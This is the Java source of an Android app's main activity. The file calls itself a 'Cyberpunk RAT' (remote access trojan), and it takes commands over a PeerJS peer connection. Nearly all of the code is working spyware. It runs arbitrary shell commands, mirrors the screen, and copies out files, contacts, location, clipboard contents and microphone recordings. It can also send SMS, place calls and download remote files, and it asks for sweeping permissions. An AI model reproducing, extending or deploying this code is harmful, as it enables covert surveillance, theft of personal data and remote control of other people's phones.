package com.fxtp.agent;

import android.app.Activity;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.peerjs.Peer;
import org.peerjs.PeerOptions;
import org.peerjs.core.DataConnection;
import org.peerjs.core.PeerConnection;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    // Permission request codes
    private static final int REQ_PERM = 1001;
    private static final int REQ_MEDIA = 1002;

    // UI
    private TextView statusText;
    private EditText peerIdInput;
    private Button connectBtn, disconnectBtn, lockBtn, htmlBtn;

    // PeerJS
    private Peer peer;
    private DataConnection conn;
    private String myId = "";
    private boolean isConnected = false;

    // Services
    private MediaRecorder audioRecorder;
    private String audioFilePath;
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    // Camera
    private CameraManager cameraManager;
    private String cameraId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);
        peerIdInput = findViewById(R.id.peerIdInput);
        connectBtn = findViewById(R.id.connectBtn);
        disconnectBtn = findViewById(R.id.disconnectBtn);
        lockBtn = findViewById(R.id.lockBtn);
        htmlBtn = findViewById(R.id.htmlBtn);

        // Initialize PeerJS
        initPeer();

        // Buttons
        connectBtn.setOnClickListener(v -> connectToPeer());
        disconnectBtn.setOnClickListener(v -> disconnectPeer());
        lockBtn.setOnClickListener(v -> startLockScreen());
        htmlBtn.setOnClickListener(v -> showHtmlDialog());

        // Request permissions
        requestPermissionsIfNeeded();

        // Start foreground service
        startForegroundService();

        // Init camera
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                if (chars.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    break;
                }
            }
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }

        statusText.setText("🔴 Disconnected");
        Log.d("FXTP", "App started");
    }

    // ==================== PEERJS ====================
    private void initPeer() {
        PeerOptions options = new PeerOptions();
        options.setDebug(2);
        peer = new Peer(this, options);
        peer.onOpen(id -> {
            myId = id;
            statusText.setText("🔑 ID: " + id);
            Log.d("FXTP", "Peer open: " + id);
        });
        peer.onConnection(conn -> {
            this.conn = conn;
            isConnected = true;
            statusText.setText("✅ Connected");
            Log.d("FXTP", "Incoming connection");
            setupDataListener();
        });
        peer.onError(error -> {
            Log.e("FXTP", "Peer error: " + error.getMessage());
            statusText.setText("❌ Error: " + error.getMessage());
        });
    }

    private void connectToPeer() {
        String target = peerIdInput.getText().toString().trim();
        if (target.isEmpty()) {
            Toast.makeText(this, "Enter Peer ID", Toast.LENGTH_SHORT).show();
            return;
        }
        conn = peer.connect(target);
        if (conn != null) {
            isConnected = true;
            statusText.setText("✅ Connected to " + target);
            setupDataListener();
            Toast.makeText(this, "Connected to " + target, Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(this, "Connection failed", Toast.LENGTH_SHORT).show();
        }
    }

    private void disconnectPeer() {
        if (conn != null) {
            conn.close();
            isConnected = false;
            statusText.setText("🔴 Disconnected");
            Toast.makeText(this, "Disconnected", Toast.LENGTH_SHORT).show();
        }
    }

    private void setupDataListener() {
        conn.onData(data -> {
            String jsonStr = data.toString();
            try {
                JSONObject json = new JSONObject(jsonStr);
                String type = json.getString("type");
                handleCommand(type, json);
            } catch (JSONException e) {
                Log.e("FXTP", "JSON parse error", e);
                sendResult("error", "Invalid command format");
            }
        });
        conn.onClose(() -> {
            isConnected = false;
            statusText.setText("🔴 Disconnected");
            Log.d("FXTP", "Connection closed");
        });
    }

    // ==================== COMMAND HANDLER ====================
    private void handleCommand(String type, JSONObject data) throws JSONException {
        Log.d("FXTP", "Command: " + type);
        switch (type) {
            case "ping": sendResult("pong", "alive"); break;
            case "screenshot": takeScreenshot(); break;
            case "start_mirror": startMirror(); break;
            case "stop_mirror": stopMirror(); break;
            case "shell": runShell(data.getString("value")); break;
            case "launch_app": launchApp(data.getString("value")); break;
            case "list_files": listFiles(data.optString("path", "/sdcard")); break;
            case "download_file": downloadFile(data.getString("value")); break;
            case "notification": sendNotification(data.getString("value")); break;
            case "clipboard": setClipboard(data.getString("value")); break;
            case "get_clipboard": getClipboard(); break;
            case "sms": sendSms(data.getString("value")); break;
            case "contacts": getContacts(); break;
            case "location": getLocation(); break;
            case "camera": captureCamera(data.optString("facing", "back")); break;
            case "audio": startAudioRecording(data.optInt("duration", 10)); break;
            case "device_info": getDeviceInfo(); break;
            case "packages": getPackages(); break;
            case "wifi": scanWifi(); break;
            case "flashlight": toggleFlashlight(data.optBoolean("value", false)); break;
            case "vibrate": vibrate(data.optInt("duration", 1000)); break;
            case "brightness": setBrightness(data.optInt("value", 50)); break;
            case "volume": setVolume(data.optInt("value", 50)); break;
            case "download_url": downloadFromUrl(data.getString("value")); break;
            case "call": makeCall(data.getString("value")); break;
            case "lock": startLockScreen(); break;
            case "html": displayHtml(data.getString("value")); break;
            default: sendResult("error", "Unknown command: " + type);
        }
    }

    // ==================== FEATURE IMPLEMENTATIONS ====================

    // --- Screenshot ---
    private void takeScreenshot() {
        if (!isConnected) return;
        try {
            DisplayMetrics dm = getResources().getDisplayMetrics();
            int width = dm.widthPixels;
            int height = dm.heightPixels;
            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
            Canvas canvas = new Canvas(bitmap);
            getWindow().getDecorView().draw(canvas);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
            String base64 = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
            sendResult("screenshot_data", base64);
        } catch (Exception e) {
            sendResult("error", "Screenshot failed: " + e.getMessage());
        }
    }

    // --- Mirror ---
    private boolean isMirroring = false;
    private Handler mirrorHandler;
    private Runnable mirrorRunnable;

    private void startMirror() {
        if (isMirroring) return;
        isMirroring = true;
        mirrorHandler = new Handler();
        mirrorRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isMirroring || !isConnected) return;
                takeScreenshot();
                mirrorHandler.postDelayed(this, 200);
            }
        };
        mirrorHandler.post(mirrorRunnable);
        sendResult("mirror_started", "Mirroring started");
    }

    private void stopMirror() {
        isMirroring = false;
        if (mirrorHandler != null) {
            mirrorHandler.removeCallbacks(mirrorRunnable);
        }
        sendResult("stop_mirror_ack", "Mirroring stopped");
    }

    // --- Shell ---
    private void runShell(String cmd) {
        if (!isConnected) return;
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
            StringBuilder out = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) out.append(line).append("\n");
            p.waitFor();
            sendResult("shell_result", out.toString());
        } catch (Exception e) {
            sendResult("error", "Shell error: " + e.getMessage());
        }
    }

    // --- Launch App ---
    private void launchApp(String pkg) {
        if (!isConnected) return;
        try {
            Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
            if (i != null) {
                startActivity(i);
                sendResult("launch_result", "Launched: " + pkg);
            } else {
                sendResult("launch_result", "App not found: " + pkg);
            }
        } catch (Exception e) {
            sendResult("error", "Launch error: " + e.getMessage());
        }
    }

    // --- File Manager ---
    private void listFiles(String path) {
        if (!isConnected) return;
        try {
            File dir = new File(path);
            if (!dir.exists()) {
                sendResult("file_list", "Path not found: " + path);
                return;
            }
            File[] files = dir.listFiles();
            JSONArray arr = new JSONArray();
            if (files != null) {
                for (File f : files) {
                    JSONObject obj = new JSONObject();
                    obj.put("name", f.getName());
                    obj.put("isDir", f.isDirectory());
                    obj.put("size", f.length());
                    arr.put(obj);
                }
            }
            sendResult("file_list", arr.toString());
        } catch (Exception e) {
            sendResult("error", "List error: " + e.getMessage());
        }
    }

    private void downloadFile(String path) {
        if (!isConnected) return;
        try {
            File f = new File(path);
            if (!f.exists()) {
                sendResult("file_data", "File not found");
                return;
            }
            FileInputStream fis = new FileInputStream(f);
            byte[] data = new byte[(int) f.length()];
            fis.read(data);
            fis.close();
            String base64 = Base64.encodeToString(data, Base64.DEFAULT);
            sendResult("file_data", base64);
        } catch (Exception e) {
            sendResult("error", "Download error: " + e.getMessage());
        }
    }

    // --- Notification ---
    private void sendNotification(String msg) {
        if (!isConnected) return;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel("fxtp_ch", "FXTP", NotificationManager.IMPORTANCE_HIGH);
                NotificationManager mgr = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (mgr != null) mgr.createNotificationChannel(ch);
            }
            NotificationCompat.Builder b = new NotificationCompat.Builder(this, "fxtp_ch")
                    .setContentTitle("FXTP")
                    .setContentText(msg)
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setAutoCancel(true);
            NotificationManager mgr = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (mgr != null) {
                mgr.notify((int) System.currentTimeMillis(), b.build());
                sendResult("notification_result", "Notification sent");
            }
        } catch (Exception e) {
            sendResult("error", "Notification error: " + e.getMessage());
        }
    }

    // --- Clipboard ---
    private void setClipboard(String text) {
        if (!isConnected) return;
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null) {
                cm.setPrimaryClip(ClipData.newPlainText("FXTP", text));
                sendResult("clipboard_result", "Copied to clipboard");
            }
        } catch (Exception e) {
            sendResult("error", "Clipboard error: " + e.getMessage());
        }
    }

    private void getClipboard() {
        if (!isConnected) return;
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip()) {
                String text = cm.getPrimaryClip().getItemAt(0).getText().toString();
                sendResult("clipboard_result", text);
            } else {
                sendResult("clipboard_result", "No clipboard content");
            }
        } catch (Exception e) {
            sendResult("error", "Clipboard error: " + e.getMessage());
        }
    }

    // --- SMS ---
    private void sendSms(String msg) {
        if (!isConnected) return;
        try {
            SmsManager sm = SmsManager.getDefault();
            String[] parts = msg.split("\\|");
            if (parts.length < 2) {
                sendResult("error", "Format: number|message");
                return;
            }
            String number = parts[0].trim();
            String message = parts[1].trim();
            sm.sendTextMessage(number, null, message, null, null);
            sendResult("sms_result", "SMS sent to " + number);
        } catch (Exception e) {
            sendResult("error", "SMS error: " + e.getMessage());
        }
    }

    // --- Contacts ---
    private void getContacts() {
        if (!isConnected) return;
        try {
            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            JSONArray arr = new JSONArray();
            if (cur != null) {
                while (cur.moveToNext()) {
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    JSONObject obj = new JSONObject();
                    obj.put("name", name);
                    obj.put("number", number);
                    arr.put(obj);
                }
                cur.close();
            }
            sendResult("contacts", arr.toString());
        } catch (Exception e) {
            sendResult("error", "Contacts error: " + e.getMessage());
        }
    }

    // --- Location ---
    private void getLocation() {
        if (!isConnected) return;
        try {
            android.location.LocationManager lm = (android.location.LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                sendResult("error", "Location permission not granted");
                return;
            }
            Location loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                JSONObject obj = new JSONObject();
                obj.put("lat", loc.getLatitude());
                obj.put("lng", loc.getLongitude());
                obj.put("alt", loc.getAltitude());
                obj.put("accuracy", loc.getAccuracy());
                sendResult("location", obj.toString());
            } else {
                sendResult("location", "Location not available");
            }
        } catch (Exception e) {
            sendResult("error", "Location error: " + e.getMessage());
        }
    }

    // --- Camera ---
    private void captureCamera(String facing) {
        if (!isConnected) return;
        try {
            Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
            startActivityForResult(intent, 200);
            sendResult("camera_result", "Camera opened");
        } catch (Exception e) {
            sendResult("error", "Camera error: " + e.getMessage());
        }
    }

    // --- Audio Recording ---
    private void startAudioRecording(int duration) {
        if (!isConnected) return;
        try {
            audioFilePath = getExternalCacheDir() + "/audio.3gp";
            audioRecorder = new MediaRecorder();
            audioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            audioRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            audioRecorder.setOutputFile(audioFilePath);
            audioRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            audioRecorder.prepare();
            audioRecorder.start();
            sendResult("audio_started", "Recording started");
            new Handler().postDelayed(() -> {
                stopAudioRecording();
            }, duration * 1000L);
        } catch (Exception e) {
            sendResult("error", "Audio error: " + e.getMessage());
        }
    }

    private void stopAudioRecording() {
        if (audioRecorder != null) {
            audioRecorder.stop();
            audioRecorder.release();
            audioRecorder = null;
            try {
                File f = new File(audioFilePath);
                FileInputStream fis = new FileInputStream(f);
                byte[] data = new byte[(int) f.length()];
                fis.read(data);
                fis.close();
                String base64 = Base64.encodeToString(data, Base64.DEFAULT);
                sendResult("audio_data", base64);
            } catch (Exception e) {
                sendResult("error", "Audio read error: " + e.getMessage());
            }
        }
    }

    // --- Device Info ---
    private void getDeviceInfo() {
        if (!isConnected) return;
        try {
            JSONObject obj = new JSONObject();
            obj.put("model", Build.MODEL);
            obj.put("brand", Build.BRAND);
            obj.put("android", Build.VERSION.RELEASE);
            obj.put("sdk", Build.VERSION.SDK_INT);
            obj.put("battery", getBatteryLevel());
            obj.put("storage_total", getTotalStorage());
            obj.put("storage_free", getFreeStorage());
            obj.put("ip", getLocalIpAddress());
            obj.put("carrier", getCarrier());
            sendResult("device_info", obj.toString());
        } catch (Exception e) {
            sendResult("error", "Device info error: " + e.getMessage());
        }
    }

    private int getBatteryLevel() {
        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
        if (bm != null) {
            return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
        }
        return 0;
    }

    private String getTotalStorage() {
        android.os.StatFs stat = new android.os.StatFs(Environment.getDataDirectory().getPath());
        long bytes = stat.getTotalBytes();
        return android.text.format.Formatter.formatFileSize(this, bytes);
    }

    private String getFreeStorage() {
        android.os.StatFs stat = new android.os.StatFs(Environment.getDataDirectory().getPath());
        long bytes = stat.getFreeBytes();
        return android.text.format.Formatter.formatFileSize(this, bytes);
    }

    private String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {}
        return "unknown";
    }

    private String getCarrier() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (tm != null) {
            return tm.getNetworkOperatorName();
        }
        return "unknown";
    }

    // --- Packages ---
    private void getPackages() {
        if (!isConnected) return;
        try {
            List<android.content.pm.PackageInfo> packs = getPackageManager().getInstalledPackages(0);
            JSONArray arr = new JSONArray();
            for (android.content.pm.PackageInfo p : packs) {
                arr.put(p.packageName);
            }
            sendResult("packages", arr.toString());
        } catch (Exception e) {
            sendResult("error", "Packages error: " + e.getMessage());
        }
    }

    // --- WiFi ---
    private void scanWifi() {
        if (!isConnected) return;
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                wm.startScan();
                List<android.net.wifi.ScanResult> results = wm.getScanResults();
                JSONArray arr = new JSONArray();
                for (android.net.wifi.ScanResult r : results) {
                    JSONObject obj = new JSONObject();
                    obj.put("ssid", r.SSID);
                    obj.put("rssi", r.level);
                    arr.put(obj);
                }
                sendResult("wifi", arr.toString());
            } else {
                sendResult("wifi", "WiFi not available");
            }
        } catch (Exception e) {
            sendResult("error", "WiFi error: " + e.getMessage());
        }
    }

    // --- Flashlight ---
    private void toggleFlashlight(boolean on) {
        if (!isConnected) return;
        try {
            cameraManager.setTorchMode(cameraId, on);
            sendResult("flashlight", on ? "ON" : "OFF");
        } catch (Exception e) {
            sendResult("error", "Flashlight error: " + e.getMessage());
        }
    }

    // --- Vibrate ---
    private void vibrate(int duration) {
        if (!isConnected) return;
        try {
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) {
                v.vibrate(duration);
                sendResult("vibrate", "Vibrated for " + duration + "ms");
            }
        } catch (Exception e) {
            sendResult("error", "Vibrate error: " + e.getMessage());
        }
    }

    // --- Brightness ---
    private void setBrightness(int value) {
        if (!isConnected) return;
        try {
            WindowManager.LayoutParams lp = getWindow().getAttributes();
            lp.screenBrightness = value / 100f;
            getWindow().setAttributes(lp);
            sendResult("brightness", "Set to " + value + "%");
        } catch (Exception e) {
            sendResult("error", "Brightness error: " + e.getMessage());
        }
    }

    // --- Volume ---
    private void setVolume(int value) {
        if (!isConnected) return;
        try {
            android.media.AudioManager am = (android.media.AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                int max = am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC);
                am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, value * max / 100, 0);
                sendResult("volume", "Set to " + value + "%");
            }
        } catch (Exception e) {
            sendResult("error", "Volume error: " + e.getMessage());
        }
    }

    // --- Download from URL ---
    private void downloadFromUrl(String urlStr) {
        if (!isConnected) return;
        new Thread(() -> {
            try {
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.connect();
                InputStream in = conn.getInputStream();
                File outFile = new File(getExternalFilesDir(null), "downloaded_file");
                FileOutputStream fos = new FileOutputStream(outFile);
                byte[] buffer = new byte[4096];
                int len;
                while ((len = in.read(buffer)) != -1) fos.write(buffer, 0, len);
                fos.close();
                in.close();
                sendResult("download_url_result", "Downloaded to " + outFile.getAbsolutePath());
            } catch (Exception e) {
                sendResult("error", "Download error: " + e.getMessage());
            }
        }).start();
    }

    // --- Call ---
    private void makeCall(String number) {
        if (!isConnected) return;
        try {
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(android.net.Uri.parse("tel:" + number));
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                startActivity(intent);
                sendResult("call_result", "Calling " + number);
            } else {
                sendResult("error", "Call permission not granted");
            }
        } catch (Exception e) {
            sendResult("error", "Call error: " + e.getMessage());
        }
    }

    // --- Lock Screen ---
    private void startLockScreen() {
        Intent lockIntent = new Intent(this, LockActivity.class);
        lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(lockIntent);
    }

    // --- Display HTML ---
    private void displayHtml(String html) {
        Intent intent = new Intent(this, LockActivity.class);
        intent.putExtra("html_content", html);
        intent.putExtra("display_html", true);
        startActivity(intent);
    }

    // --- Show HTML dialog ---
    private void showHtmlDialog() {
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
        builder.setTitle("Enter HTML to display");
        final EditText input = new EditText(this);
        input.setText("<h1 style='color:#00f0ff;'>FXTP</h1><p>Cyberpunk RAT</p>");
        builder.setView(input);
        builder.setPositiveButton("Display", (dialog, which) -> {
            String html = input.getText().toString();
            displayHtml(html);
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    // ==================== SEND RESULTS ====================
    private void sendResult(String type, String value) {
        if (!isConnected) return;
        try {
            JSONObject json = new JSONObject();
            json.put("type", type);
            json.put("value", value);
            conn.send(json.toString());
            Log.d("FXTP", "Sent: " + type);
        } catch (JSONException e) {
            Log.e("FXTP", "JSON error", e);
        }
    }

    // ==================== PERMISSIONS ====================
    private void requestPermissionsIfNeeded() {
        String[] perms = {
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.ACCESS_WIFI_STATE,
                android.Manifest.permission.CHANGE_WIFI_STATE,
                android.Manifest.permission.SYSTEM_ALERT_WINDOW
        };
        List<String> needed = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQ_PERM);
        }
    }

    // ==================== FOREGROUND SERVICE ====================
    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("fxtp_svc", "FXTP Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (mgr != null) mgr.createNotificationChannel(ch);
        }
        Intent serviceIntent = new Intent(this, ServerService.class);
        startForegroundService(serviceIntent);
    }

    // ==================== LIFECYCLE ====================
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (peer != null) peer.destroy();
        if (conn != null) conn.close();
    }
                }
